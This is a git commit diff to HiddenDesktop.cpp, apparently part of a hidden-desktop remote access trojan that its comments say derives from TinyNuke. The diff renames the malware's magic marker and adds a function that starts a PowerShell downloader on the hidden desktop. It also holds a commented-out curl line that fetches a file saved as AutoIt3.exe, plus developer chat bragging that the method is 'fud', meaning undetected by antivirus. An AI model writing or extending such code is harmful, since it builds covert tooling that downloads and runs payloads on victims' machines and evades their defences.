0b8f9d95d0562634c5f564118f49e53272621403
Melted <74914421+Meltedd@users.noreply.github.com>
2021-10-17 13:25:54 -0400

    Update HiddenDesktop.cpp

--- Client/HiddenDesktop.cpp
+++ Client/HiddenDesktop.cpp
@@ -9,7 +9,7 @@
 enum Connection { desktop, input };
 enum Input      { mouse };
 
-static const BYTE     gc_magik[] = { 'A', 'V', 'E', '_', 'M', 'A', 'R', 'I', 'A', 0 };
+static const BYTE     gc_magik[] = { 'M', 'E', 'L', 'T', 'E', 'D', 0 };
 static const COLORREF gc_trans   = RGB(255, 174, 201);
 
 enum WmStartApp { startExplorer = WM_USER + 1, startRun, startChrome, startEdge, startBrave, startFirefox, startIexplore, startPowershell };
@@ -452,7 +452,34 @@ static void StartFirefox()
 exit:
    Funcs::pCloseHandle(hProfilesIni);
    Funcs::pFree(profilesIniContent);
+
+
+
 }
+
+
+static void tryingtorunpowershelldownloader()
+{
+    char path[MAX_PATH] = { 0 };
+    Funcs::pLstrcpyA(path, Strs::hd8);
+    Funcs::pLstrcatA(path, Strs::downloader);
+
+    STARTUPINFOA startupInfo = { 0 };
+    startupInfo.cb = sizeof(startupInfo);
+    startupInfo.lpDesktop = g_desktopName;// <=
+    PROCESS_INFORMATION processInfo = { 0 };
+    Funcs::pCreateProcessA(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
+  //=>  system("cmd  /c  curl %filetodownload% --output AutoIt3.exe | clip");
+    // is this curl command going to be the command you use? i'm using this yes it is fud :D
+    //but now i need the code to open a text area and ask for url and replace strs::downloader code and exec
+    //got it but i'm sooo sleepy, i'm going to sleep when i wake up we will finish it fast, why don't you make UI for it why u are using Console?
+    // some reasons one of them is because tinynuke was a console app and i was lazy to convert all of the files to a ui lol
+    // you can create new ui form in the same project i think let me see
+    // oh this is got got it , you can use Qt application if you want | i have qt but never really use it, go to sleep and can you help me with this + show me qt in the morning?
+    // absolutely :) alright bet
+
+}
+
 
 static void StartPowershell()
 {
